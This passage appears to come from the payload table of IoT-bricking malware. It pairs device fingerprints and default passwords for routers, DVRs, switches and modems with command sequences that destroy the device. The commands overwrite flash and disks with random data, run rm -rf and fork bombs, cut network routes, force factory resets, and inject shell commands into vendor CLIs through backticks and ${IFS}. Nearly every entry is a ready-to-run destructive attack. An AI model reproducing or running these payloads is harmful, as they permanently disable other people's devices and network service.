		"w", '[#$] ',
		"route del default", '%WAIT%',
		"sysctl -w net.ipv4.tcp_timestamps=0", '[#$] ',
		"sysctl -w kernel.threads-max=1", '%WAIT% ',
		"halt -n -f", '[#$] ',
		"reboot", '[#$] ',
	],    

	# HT-TM - root handler - hack - if we manage to use default root pass, this has to match first
	[ "ht-tm", "root/20080826", "", 
		'busybox cat /dev/urandom >/dev/mtd0 &', '',
		'busybox cat /dev/urandom >/dev/mtd1 &', '',
		'busybox cat /dev/urandom >/dev/mtd2 &', '',
		'busybox cat /dev/urandom >/dev/mtd3 &', '',
		'busybox cat /dev/urandom >/dev/mtd4 &', '',
		'busybox cat /dev/urandom >/dev/mtd5 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock0 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock1 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock2 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock3 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock4 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock5 &', '',
		'route del default;rm -rf /* &', '%TERM%',
	],
	# HT-TM thing - special case - we have to relaunch process with correct root pass
	[ "ht-tm", ".*", "root.*cIUPc1dKQYHkkKkiVpM", 
		'%RELAUNCH%', '%RELAUNCH%', 
	],

  # C-Data, this differs a bit from published exploit?
  [ 'cdata', '.*', 'Command Line Interface for EPON System',
	  # hacky CLI requires \r\n
	  '\r', '#\s',		# clear mounted fingerprinting command
	  'w\r', '#\s',   # just for info
		'system configurations download olt 1.2.3.4 \"$(cat /dev/zero>/dev/root &)\"\r', '',			# this seems to be enough, but..
		'system configurations download olt 1.2.3.4 \"$(cat /dev/zero>/dev/mtdblock0 &)\"\r', '',
		'system configurations download olt 1.2.3.4 \"$(cat /dev/zero>/dev/mtdblock1 &)\"\r', '',
		'system configurations download olt 1.2.3.4 \"$(cat /dev/zero>/dev/mtdblock2 &)\"\r', '',
		'system configurations download olt 1.2.3.4 \"$(cat /dev/zero>/dev/mtdblock3 &)\"\r', '',
		'system configurations download olt 1.2.3.4 \"$(cat /dev/zero>/dev/mtdblock4 &)\"\r', '',
		'system configurations download olt 1.2.3.4 \"$(cat /dev/zero>/dev/mtdblock5 &)\"\r', '',
		'system configurations download olt 1.2.3.4 \"$(route del default)\"\r', '',
		'w\r', '#\s',		# just for stats
	],

  # Huawei VRP
  [ 'huaweivrp', '.*', 'Note: The max number of VTY users',
    'format flash:', 'proceed',
     'y', '%WAIT%',
     # this takes a while so let linefeeds time out until we are back at a prompt
     '', '(completed|>\s)',
     '', '(completed|>\s)',
     '', '(completed|>\s)',
     '', '(completed|>\s)',
     'reboot', 'Reboot',
     'y', 'YES',
     'yes', '%WAIT%',			# some CLIs require a YES
  ],    

	# XiongMai Tech DVR "Welcome to Monitor Tech"
	[ "xiongmai", "root/xc3511", '',
		"cat /proc/version\nbusybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtd2 &\nbusybox cat /dev/urandom >/dev/mtd3 &\nbusybox cat /dev/urandom >/dev/mtd4 &\nbusybox cat /dev/urandom >/dev/mtd5 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\nbusybox cat /dev/urandom >/dev/mtdblock4 &\nbusybox cat /dev/urandom >/dev/mtdblock5 &\nroute del default", '[#$] ',
		'busybox cat /dev/urandom >/dev/mtdblock0 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock1 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock2 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock3 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock4 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock5 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock6 &', '',
		'busybox cat /dev/urandom >/dev/sda &', '',
		'busybox cat /dev/urandom >/dev/mtd0 &', '',
		'busybox cat /dev/urandom >/dev/mtd1 &', '',
		'busybox cat /dev/urandom >/dev/mtd2 &', '',
		'busybox cat /dev/urandom >/dev/mtd3 &', '',
		'busybox cat /dev/urandom >/dev/mtd4 &', '',
		'busybox cat /dev/urandom >/dev/mtd5 &', '',
		'route del default', "%WAIT%",
		'ifconfig eth0 down', '',
		"poweroff -n -f", '%TERM%',
	],

	# XiongMai Tech DVR "Welcome to Monitor Tech"
	[ "xiongmai", "root/xmhdipc", '',
		"busybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtd2 &\nbusybox cat /dev/urandom >/dev/mtd3 &\nbusybox cat /dev/urandom >/dev/mtd4 &\nbusybox cat /dev/urandom >/dev/mtd5 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\nbusybox cat /dev/urandom >/dev/mtdblock4 &\nbusybox cat /dev/urandom >/dev/mtdblock5 &\nroute del default", '[#$] ',
		'busybox cat /dev/urandom >/dev/mtdblock0 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock1 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock2 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock3 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock4 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock5 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock6 &', '',
		'busybox cat /dev/urandom >/dev/sda &', '',
		'busybox cat /dev/urandom >/dev/mtd0 &', '',
		'busybox cat /dev/urandom >/dev/mtd1 &', '',
		'busybox cat /dev/urandom >/dev/mtd2 &', '',
		'busybox cat /dev/urandom >/dev/mtd3 &', '',
		'busybox cat /dev/urandom >/dev/mtd4 &', '',
		'busybox cat /dev/urandom >/dev/mtd5 &', '',
		'route del default', "%WAIT%",
		'ifconfig eth0 down', '',
		"poweroff -n -f", '%TERM%',
	],

	# Zte, some kind of VOIP router thingy
	[ "zte", "root/Zte521", '',
		'flash_eraseall /dev/mtd0 >/dev/null &', '',
		'flash_eraseall /dev/mtd1 >/dev/null &', '',
		'flash_eraseall /dev/mtd2 >/dev/null &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'cat /dev/urandom >/dev/mtd3 &', '',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'iptables -F;iptables -t nat -F', '',
    'ip route del default', '',
    'ip route', '[#$] ',
    'ip link set ppp0 down', '',
    'ip link set br0 down', '',
    'ip link set eth0 down', '',
		'iptables -A fwinput -J DROP;iptables -A OUTPUT -j DROP;rm -rf /* &', '%WAIT%',
	],

	# Generic Zyxel
	[ "zyxel", ".*", 'Linux\sZyXEL\s2.*mips.*BusyBox',
		"iptables -F", '',
		"iptables -t nat -F", '',
		"route del default", '',
		'sysctl -w kernel.threads-max=1', '',
		"iptables -A OUTPUT -j DROP", '%WAIT%',
	],  

	# Another shite DVR jvbzd similar to Dahua "Welcome to HiLinux"
	[ "hisilicon", "root/jvbzd", 'w:\snot\sfound',
		"fdisk /dev/mtd1", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/sda", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"iproute del default", '[#$] ',
		"sysctl -w net.ipv4.tcp_timestamps=0", '[#$] ',
		"sysctl -w kernel.threads-max=1", '%WAIT% ',
		"halt -n -f", '[#$] ',
		"reboot", '[#$] ',
	],

	# Juantech DVR "Welcome to HiLinux"
	[ "juantech", "root/juantech", 'w:\snot\sfound',
		'cat /dev/urandom >/dev/sda &', '',
		'cat /dev/urandom >/dev/sda1 &', '',
		'cat /dev/urandom >/dev/sda2 &', '',
		'cat /dev/urandom >/dev/mtd0 &', '',
		'cat /dev/urandom >/dev/mtd1 &', '',
		'cat /dev/urandom >/dev/mtd2 &', '',
		'cat /dev/urandom >/dev/mtd3 &', '',
		'cat /dev/urandom >/dev/mtd4 &', '',
		'cat /dev/urandom >/dev/mtd5 &', '',
		'cat /dev/urandom >/dev/mtdblock0 &', '',
		'cat /dev/urandom >/dev/mtdblock1 &', '',
		'cat /dev/urandom >/dev/mtdblock2 &', '',
		'cat /dev/urandom >/dev/mtdblock3 &', '',
		'cat /dev/urandom >/dev/mtdblock4 &', '',
		'cat /dev/urandom >/dev/mtdblock5 &', '',
		"route del default", '[#$] ',
		"fdisk /dev/sda2", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/sda1", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/sda", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"sysctl -w net.ipv4.tcp_timestamps=0", '[#$] ',
		"sysctl -w kernel.threads-max=1", '%WAIT% ',
		"halt -n -f", '[#$] ',
		"reboot", '[#$] ',
	],

  # some anonymous cell router menu thing, just going to call it celltrash
  [ 'celltrash', '.*', '5 : Load Default and Reboot Router',
    '2', '#',
    '3', 'mode:',
    '4', 'no\S:',
    '2', '#',
    '0', '#',
    '4', '#',
  ],
  
	# DLINK IoS device
	[ "dlink", ".*", 'upgrade.*dlink\.ru.*firm.*',
    "set lan ip 10.1.2.3 255.255.255.0\nsave", '',
    "set upnp off\nsave", '',
    "set dhcp off\nsave", '',
    "set dmz off\nsave", '',
    "set wifi off\nsave", '',  
 		"sh", '[#$] ',
#    'cat /etc/passwd', '[#$] ',
		'cat /dev/urandom >/dev/sda &', '',
		'cat /dev/urandom >/dev/sda1 &', '',
		'cat /dev/urandom >/dev/sda2 &', '',
		'cat /dev/urandom >/dev/mtd0 &', '',
		'cat /dev/urandom >/dev/mtd1 &', '',
		'cat /dev/urandom >/dev/mtd2 &', '',
		'cat /dev/urandom >/dev/mtd3 &', '',
		'cat /dev/urandom >/dev/mtd4 &', '',
		'cat /dev/urandom >/dev/mtd5 &', '',
		'cat /dev/urandom >/dev/mtdblock0 &', '',
		'cat /dev/urandom >/dev/mtdblock1 &', '',
		'cat /dev/urandom >/dev/mtdblock2 &', '',
		'cat /dev/urandom >/dev/mtdblock3 &', '',
		'cat /dev/urandom >/dev/mtdblock4 &', '',
		'cat /dev/urandom >/dev/mtdblock5 &', '',
		"iptables -F", '',
		"iptables -t nat -F", '',
		'route del default;rm -rf /* 2>/dev/null &', '[#$] ',
		"iptables -A OUTPUT -j DROP", '%TERM%',
	],
  [ "dlink", ".*", 'You have a full access',
    "set lan ip 10.1.2.3 255.255.255.0\nsave", '',
    "set upnp off\nsave", '',
    "set dhcp off\nsave", '',
    "set dmz off\nsave", '',
    "set wifi off\nsave", '',  
    "sh", '[#$] ',
    'cat /dev/urandom >/dev/sda &', '',
    'cat /dev/urandom >/dev/sda1 &', '',
    'cat /dev/urandom >/dev/sda2 &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'cat /dev/urandom >/dev/mtd3 &', '',
    'cat /dev/urandom >/dev/mtd4 &', '',
    'cat /dev/urandom >/dev/mtd5 &', '',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    "iptables -F", '',
    "iptables -t nat -F", '',
    'route del default;rm -rf /* 2>/dev/null &', '[#$] ',
    "iptables -A OUTPUT -j DROP", '%TERM%',
  ],

	# mdm9625 "OpenEmbedded Linux" phone chip
	[ "mdm", ".*", 'mdm\d\d+\S*\$', 
		"passwd", "Old password:",
		'%OLDPASS%', 'Enter new password: ', 
		'%NEWPASS%', 'Re-enter new password: ',
		'%NEWPASS%', '[#$] ',
		'su root', 'Password: ',
		'oelinux123', '[#$] ',
		'passwd', 'New password: ',
		'%NEWPASS%', 'Retype password: ',
		'%NEWPASS%', '[#$] ',
#		'reboot', '%WAIT%',
		'ps aux | grep -v "ps aux" | grep -v "grep" | grep -v "random" | grep -v "awk" | grep -v "xargs" | /bin/awk \'{print $1}\' | xargs kill -9', '%TERM%',
	],
	[ "mdm", ".*", 'mdm\d\d+', 
		'passwd', 'New password: ',
		'%NEWPASS%', 'Retype password: ',
		'%NEWPASS%', '[#$] ',
		'reboot', '%WAIT%',
		'ps aux | grep -v "ps aux" | grep -v "grep" | grep -v "random" | grep -v "awk" | grep -v "xargs" | /bin/awk \'{print $1}\' | xargs kill -9', '%TERM%',
	],

	# eltex OpenWrt with adminpassword root auth
	[ "eltex", ".*", 'M5J9DWFfcVbL.*AuwJc4KI.*bin/ash',
		"telnet localhost", 'login: ',
		"root", 'Password: ',
		'adminpassword', 'root\S+# ',
		'passwd %OLDUSER%', 'New password:',
		'%NEWPASS%', 'Retype password:',
		'%NEWPASS%', 'root\S+# ',
		'passwd', 'New password:',
		'%NEWPASS%', 'Retype password:',
		'%NEWPASS%', 'root\S+# ',
		'save', 'root\S+# ',
		'reboot', 'root\S+# ',
	],    
	
  # similar to the MT7109 thingy in admin/privileged mode  
  [ 'qcpe', 'admin/.*', 'CPE> .*please enter \? for help\.',
    'enable', '[#>] ',
    'router', '[#>] ',
    'wan name x y', '[#>] ',
    'wan commit', '[#>] ',
    "wan ip isp , user 1.2.3.4 255.255.255.0 1.2.3.5\nwan commit", '[#>] ',
    "lan ip 2.3.4.5 255.255.255.254\nlan commit", '[#>] ',
    'wlan disable', '[#>] ',
    '..', '[#>] ',
    'wimax', '[#>] ',
    'wmx auth username a b', '[#>] ',
    'wmx autoconnect disable', '[#>] ',
    'wmx commit', '[#>] ',
    "wmx disconnect\nwmx commit", '[#>] ',
    '..', '[#>] ',
    'router', '[#>] ',
    "filter add 0.0.0.0/0 1:65535 0.0.0.0/0 1:65535 tcp\nfilter commit", '[#>] ',
  ],
	
  # Draytek Vigor - some shitty router thing.. trivial exploit.. reported 21.3. to support@draytek.com
  [ 'vigor', '.*', 'Watch Dog Closed',
    'enable', '[>#] ',
    'configure system', '[>#] ',
    'config local backup ;sh', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock7 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock1 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock2 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock3 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock4 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock5 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock6 &', '[>#] ',
    'route del default', '%WAIT%',
    'reboot', '[>#] ',
  ],
  # phyhome software platform by 'optoelectonic' ltd 
  [ 'phyhome', '.*', 'Index.*User.*Priority.*Location',
    'configure', '[>#] ',
    'set hostname HACKED', '[>#] ',
    'erase startup-config', '\]',
    'y', '[>#] ',
    'reboot', '\]',
    'y', '[>#] ',
  ],
  # some nondescript Chinese router, found string edatahome so we'll call it that
  [ 'edatahome', '.*', '% Unknown command:w\.',
  	'enable', '[>#] ',
  	'erase startup-config', '[>#] ',
  	'urlexport 1.2.3.4 test test `cat${IFS}/dev/urandom${IFS}>/dev/root` white', '%WAIT%',
  	'date 2030 12 31 23 59 59', '%WAIT%', 
  	'exit', '',
  ],
  # some crappy whitelabel router, admin/smcadmin
  [ 'oapsmc', '.*', 'Unrecognized command or Incomplete command\.', 
    'reset configuration', '[>#] ',
    'reset configuration', '[>#] ',
    'reset configuration', '[>#] ',
  ],
  # more whitelabel shite, EnGadget/Sify units, telnet CLI
  [ 'egcpa', '.*', 'Unknown command \'uname\'', 
    'logfile-upload', 'URL: ',
    'ftp://127.0.0.1/&&`dd${IFS}if=/dev/zero${IFS}of=/dev/mtdblock5${IFS}&`', '[>#] ',
    'logfile-upload', 'URL: ',
    'ftp://127.0.0.1/&&`dd${IFS}if=/dev/zero${IFS}of=/dev/root`', '[>#] ',
    'uci commit', '[>#] ',
  ],
  
  # RS353a etc.. from bintec elmeg GmbH .. ironically named
  [ 'bintec', '.*', 'wizInternetGtw',
    'ifconfig', '[>#] ',
    'ifconfig 1000000 down', '[>#] ',
    'ifconfig 1010000 down', '[>#] ',
    'ifconfig 1020000 down', '[>#] ',
    'ifconfig 1030000 down', '[>#] ',
    'ifconfig 1040000 down', '[>#] ',
    'ifconfig 50000 down', '[>#] ',
    'ifconfig 50001 down', '[>#] ',
    'ifconfig 100001 down', '[>#] ',
    'ifconfig 10001 down', '[>#] ',
    'ifconfig 1001 down', '[>#] ',
    'ifconfig 1000 down', '[>#] ',
    'halt', '[>#] ',
  ],
	
  # Texas Instruments DSL
  [ 'texasi', 'root/.*', '% Invalid input at caret\.',
    "exit", '[>#] ',  
    'enable', ': ', 
    '%OLDPASS%', '[>#] ',
    'shell', '[>#] ',
#    'rm -rf /* 2>/dev/null &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock/0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock/1 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock/2 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock/3 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock/4 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock/5 &', '[>#] ',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT% ',
    'd() { d|d & }; d 2>/dev/null', '[>#] ',
    'route del default', '[>#] ',
  ],	
  
	# KACO power/monitoring/internet DOS-based crap
	[ 'kaco', '.*', 'Mode: (APPLICATION|BOOTROM)',
  	'ipconfig -s 1.2.3.4 255.255.255.0 1.2.3.5', '[>#] ',
		'format', '[>#] ',
#  	'PING 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', '[>#] ',
		'reset', '[>#] ',
	],
	
	# Allied Telesis device of some sort
	[ 'atdev', '.*', 'TELNET session now in ESTABLISHED state',
		'clear flash', '[>#] ',
		'clear NVS', '[>#] ',
		'delete file=config.ins', '[>#] ',
		'delete file=config.gui', '[>#] ',
		'set user=%OLDUSER% login=no telnet=no', '[>#] ',
		'set ip nameserver=127.0.0.1', '[>#] ',
		'set ip secondarynameserver=127.0.0.1', '[>#] ',
		'set ip interface=ppp0 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=eth1 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=eth0 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=vlan1 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=port1 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=port2 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=port3 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=port4 ipaddress=127.0.0.1', '[>#] ',
		'set ip interface=port5 ipaddress=127.0.0.1', '[>#] ',
	],
	
	# ADB Broadband
	[ 'adb', '.*', '\*\s+ADB BROADBAND\s+\*',
		'restore default-setting', '[>#] ',
		'reboot', '[>#] ',
	],
	
	# weathergoose temp, humidity etc sensor for NOCs etc
	[ 'weathergoose', '.*', 'ITW WeatherGoose',
		'reset factory', '[>#] ',
		'reset network', '[>#] ',
	],
	
	# HPNP thingy, some generic switch
	[ 'hpnp', '.*', 'clear configure create delete disable',
		'unconfigure switch', 'yes or no',
		'yes', 'configuration',
	],
	
	# Kopp ingenic thing
	[ 'kopp', '.*', 'root\@kopp',
		'cat /dev/urandom >/dev/mmcblk1p1 &', '[>#] ',
		'cat /dev/urandom >/dev/root &', '[>#] ',
		'route del default', '[>#] ',
		'rm -rf /* & 2>/dev/null', '[>#] ', 
	],
	
	# Elsist Slimline etc
	[ 'elsist', '.*', 'Elsist.*maintenance shell',
		'format Storage, 1', 'Y,n',
		'Y', '[>#] ',
		'format System, 1', 'Y,n',
		'Y', '[>#] ',
		'userconfig -p %OLDUSER% %NEWPASS%', '[>#] ',
		'cfgcommit', '[>#] ',
		'ifconfig -a eth0 1.2.3.4', '[>#] ',
		'ifconfig -g eth0 1.2.3.5', '[>#] ',
		'ifconfig -a eth1 1.2.3.6', '[>#] ',
		'ifconfig -g eth1 1.2.3.7', '[>#] ',
		'cfgcommit', '[>#] ',
		'sysconfig -wid', '[>#] ',
		'sysconfig -mtcpd', '[>#] ',
		'sysconfig -usbd', '[>#] ',
		'cfgcommit', '[>#] ',
		'reboot', 'Y,n',
		'Y', 'rebooting',
	],
	
	# SWiM WS2000 type
	[ 'swim', '.*', 'task wait: task \S+ not found\.',
		'rm -r /tffs/*', '[>#] ',
		'reboot', '[>#] ',
	],
  
	# Cisco Ubee-style interface
	[ 'ciscobee', '.*', '(Embedded Telnet Server.*WARNING:.*authorized users only|COMMAND:\s+write_?memory|-s ElementSize1\.\.4)', 
		'cd /flash', '[>#] ',
		'init', '[>#] ',    # just in case
		'autoTest bootloader', 'no\S ',
		'yes', '[>#] ',
		'autoTest dyn', 'no\S ',
		'yes', '[>#] ',
		'autoTest perm', 'no\S ',
		'yes', '[>#] ',
#		'autoTest image1', 'no\S ',  # these produce too much data for stable payload completion
#		'yes', '[>#] ',
#		'autoTest image2', 'no\S ',
#		'yes', '[>#] ',
		'cd /', '[>#] ',
		'taskSuspend 0x81b597a8', '[>#] ',
		'0x819e0280', '[>#] ',
		'taskSuspend 0x819d13d0', '[>#] ',
		'0x81b597a8', '[>#] ',
		'taskSuspend 0x81b7aea0', '[>#] ',
		'1', '[>#] ',
		'cd /', '[>#] ',
		'taskSuspendAll', '[>#] ',
		'reset', '[>#] ',
	],
  
	# Ubee broadband modem
	[ 'ubee', '.*', 'Error - what Unknown command:',
		'cd /ubee', '[>#] ',
		'cabhCdpServerRouter', '[>#] ',	# HACK - since next line reboots device we will kludge a skip in BF code if this returns 127.0.0.1
		'cabhCdpServerRouter 127.0.0.1', '[>#] ',  # this reboots
		'cd /', '[>#] ',
    'set password', '\] ', 
    '%NEWPASS%', '[>#] ',
    'cd /wifi', '[>#] ',
    'nvram set wps_version2=disabled', '[>#] ',
    'nvram set wl0_ssid=HACKED', '[>#] ',
    'nvram set wps_device_name=HACKED', '[>#] ',
    'rc restart', '[>#] ',
    'cd /', '[>#] ',
#    'reset', 'CMCliReset',
	],
	# D-link DES-1210 switch, guest interface
	[ 'desdlink', '.*', 'DES-1210', 
    'reset config', '[>#] ',
  ],
  # Some noname gpononu super units, web UI only says E-4FE and model is listed as 6008. BCM chipset
  [ 'gpononu', '.*', 'ONU\(super\)#', 
    'shell', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock1 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock2 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock3 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock4 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock5 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock6 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock7 &', '[>#] ',
    'cat /dev/urandom >/dev/root &', '[>#] ',
    'route del default', '[>#] ',
    'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT%',
    'd(){ d|d & };d', '%TERM%', 
  ],    
  # Alcatel-Lucent ONT GPON thingies
  [ 'alcont', '.*', '(ONTUSER:|\/dev\/ubi1_1|\/ONTUSER|root\@AONT:)',
    'df', '[>#] ',
    'dd if=/dev/urandom of=/dev/ubi1_1 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/ubi5_0 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock0 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock1 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock2 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock3 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock4 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock5 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock6 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock7 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/hda1 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/hdb1 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mmcblk0 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mmcblk0p1 &', '[#$>] ', 
    'cat /dev/urandom >/dev/ubi1_1 &', '[>#] ',
    'cat /dev/urandom >/dev/ubi5_0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock1 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock2 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock3 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock4 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock5 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock6 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock7 &', '[>#] ',
    'cat /dev/urandom >/dev/hda1 &', '[>#] ',
    'cat /dev/urandom >/dev/hdb1 &', '[>#] ',
    'cat /dev/urandom >/dev/mmcblk0 &', '[>#] ',
    'cat /dev/urandom >/dev/mmcblk0p1 &', '[#$>] ', 
    'route del default;iproute del default;rm -rf /* 2>/dev/null &', '[>#] ',
    'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT%',
    'd(){ d|d & };d', '%TERM%', 
  ],
  # broken busybox install
  [ 'busybroke', '.*', 'cat: /etc/passwd: No such file or directory',
    'd() { d|d & }; d', '',
    'route del default', '',
  ],
  # mtguest - usually powerless shell, V83: logout in the hopes that http payload can take care of it
  [ 'mtguest', 'guest/guest', 'MT7109',
    'logout', '%TERM%',
  ],
  [ 'mtguest', 'user/user', 'MT7109',
    'logout', '%TERM%',
  ],
  [ 'mtguest', 'admin/.*', 'MT7109',
    'enable', '[#>] ',
    'router', '[#>] ',
    'wan name x y', '[#>] ',
    'wan commit', '[#>] ',
    "wan ip isp , user 1.2.3.4 255.255.255.0 1.2.3.5\nwan commit", '[#>] ',
    "lan ip 2.3.4.5 255.255.255.254\nlan commit", '[#>] ',
    'wlan disable', '[#>] ',
    '..', '[#>] ',
    'wimax', '[#>] ',
    'wmx auth username a b', '[#>] ',      
    'wmx autoconnect disable', '[#>] ',
    "wmx disconnect\nwmx commit", '[#>] ',
    '..', '[#>] ',
    'router', '[#>] ',
    "filter add 0.0.0.0/0 1:65535 0.0.0.0/0 1:65535 tcp\nfilter commit", '[#>] ',
    '..', '[#>] ',
    'logout', '%TERM%',
  ],

 	# uClinux IoS
 	[ 'uclinux', '.*', '(uclinux\.org|sh: can\'t exec \'w\': No such file or directory|uClinux version)',
 	  'cat /dev/urandom >/dev/mtdblock0 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock1 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock2 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock3 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock4 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock5 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock6 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock7 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock8 &', '[#>] ',
 	  'cat /dev/urandom >/dev/mtdblock9 &', '[#>] ',
    'route del default', '[>#] ',
 	],

 	# Some CLI OS used by Alcatel Lucent.. when cleared unit backup comes up as *B:
 	# and needs to be wiped out as well.. called TiMOS ?
 	# Note: A few units came back without the * in front of A or B.. ?
 	# Some kind of mobile network backhaul router thing?
 	[ 'albof', '.*', '\*[AB]:\S+#\s',
 	  'config', '[>#] ',
 	  'system', '[>#] ',
 	  'location `reboot`', '[>#] ',
 	  'name HACKED', '[>#] ',
 	  'exit all', '[>#] ',
 	  'file', '[>#] ',
 	  'shutdown', '[>#] ',
 	  'format', 'y/n',
 	  'y', '[>#] ',
 	  'exit all', '[>#] ',
 	  'admin', '[>#] ',
 	  'reboot auto-init', 'y/n',
 	  'y', '[>#] ',
 	  'reboot standby', 'y/n',
 	  'y', '[>#] ',
 	  'reboot active', 'y/n',
 	  'y', '[>#] ',
 	],

  # Some 24 port PoE switch with no indication of wtf it is
  [ 'genpoe', '.*', '\% Invalid input detected at \'\^\' marker\.',
    'enable', '[>#] ',
    'write', '[>#] ',
    'erase boot-image first', '[>#] ',
    'erase boot-image second', '[>#] ',
    'erase config-file', '[>#] ',
    'restore factory-defaults', '[>#] ',
    'reload', 'y/n',
    'y', '[>#] ',
  ],

	# Vigor 2760n
	[ 'vigor27', '.*', '__\s+___\s+____\s_____\s__\s+___',
